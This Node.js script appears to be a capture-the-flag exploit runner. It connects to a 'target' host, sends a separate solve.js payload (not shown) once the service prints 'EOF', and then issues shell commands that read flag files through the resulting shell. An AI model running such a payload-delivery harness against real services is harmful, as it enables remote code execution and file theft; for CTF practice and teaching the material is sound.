const fs = require("fs");
const net = require("net");
const path = require("path");

const host = process.env.HOST || "target";
const port = Number(process.env.PORT || "8152");
const payload = fs.readFileSync(path.join(__dirname, "solve.js"), "utf8") + "\nEOF\n";
const postCommands = process.env.POST_COMMANDS || "cat flag*.txt\nexit\n";
const postDelayMs = Number(process.env.POST_DELAY_MS || "15000");
let sent = false;

const socket = net.createConnection({ host, port });
socket.setTimeout(Number(process.env.TIMEOUT_MS || "180000"));

socket.on("data", (chunk) => {
  process.stdout.write(chunk);
  if (!sent && chunk.includes("EOF")) {
    sent = true;
    socket.write(payload);
    setTimeout(() => socket.write(postCommands), postDelayMs);
  }
});

socket.on("timeout", () => {
  socket.destroy(new Error("connection timed out"));
});

socket.on("error", (err) => {
  console.error(err.message);
  process.exitCode = 1;
});
